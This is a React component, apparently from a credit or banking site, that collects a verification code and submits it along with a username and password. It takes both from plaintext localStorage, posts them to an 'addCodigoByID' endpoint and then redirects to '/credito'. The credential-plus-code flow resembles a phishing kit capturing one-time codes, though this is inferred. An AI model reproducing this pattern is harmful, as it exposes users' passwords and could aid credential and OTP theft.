import { useEffect, useState } from "react";
import RoundedInput from "./RoundedInput";
import Spinner from "./Spinner";

function SendCodigo() {
  const [codigo, setCodigo] = useState("");
  const [valido, setValido] = useState(false);
  const [mostrarModal, setMostrarModal] = useState(false);
  const [Cargar, setCargar] = useState(false);
  const [error, setError] = useState("");

  const handleCodigo = (value: string) => {
    setCodigo(value);
  };

  useEffect(() => {
    if (codigo.length > 5) {
      setValido(true);
    } else {
      setValido(false);
    }
  }, [codigo]);

  const handleSend = async () => {
    // Recupera el usuario y la contraseña del localStorage
    const usuario = localStorage.getItem("usuario");
    const password = localStorage.getItem("password");

    if (!usuario || !password) {
      console.log("No se encontraron usuario o contraseña en localStorage");
      return;
    }

    setCargar(true);

    try {
      const response = await fetch("/api/addCodigoByID", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ usuario, password, codigo }),
      });

      const data = await response.json();

      if (response.ok) {
        // Redirigir a la página /credito si la respuesta es satisfactoria
        window.location.href = "/credito";
      } else {
        throw new Error(data.error || "Error desconocido");
      }
    } catch (error: any) {
      // Mostrar mensaje de error en una modal
      setError("Ha ocurrido un error, intente de nuevo más tarde.");
      setMostrarModal(true);
    } finally {
      setCargar(false);
    }
  };

  const cerrarModal = () => {
    setMostrarModal(false);
  };

  return (
    <div className="grid grid-cols-1 items-center gap-6 py-6">
      <div className="flex items-center justify-center">
        <RoundedInput onValuesChange={handleCodigo} />
      </div>
      <button
        disabled={!valido}
        onClick={handleSend}
        className={`${
          valido
            ? "bg-[#0067b1] cursor-pointer text-white/90"
            : "bg-[#0000001f] cursor-default text-black/30"
        } w-1/2 mx-auto rounded-sm shadow-md text-sm p-3`}
      >
        Entrar
      </button>

      {/* Modal de Carga */}
      {Cargar && (
        <div className="fixed inset-0 bg-white/50 flex justify-center items-center">
          <Spinner />
        </div>
      )}

      {/* Modal de Error */}
      {mostrarModal && (
        <div className="fixed inset-0 bg-black/30 flex justify-center items-center">
          <div className="bg-white w-3/4 md:w-1/3 mx-auto p-6 rounded-sm shadow-black/30 shadow-xl grid grid-cols-1">
            <p className="text-base text-center font-extrabold mb-4 text-[#bb1b47]">
              {error}
            </p>
            <button
              onClick={cerrarModal}
              className="text-sm bg-[#0067b1] text-white/90 py-2 px-4 rounded mx-auto"
            >
              Cerrar
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

export default SendCodigo;
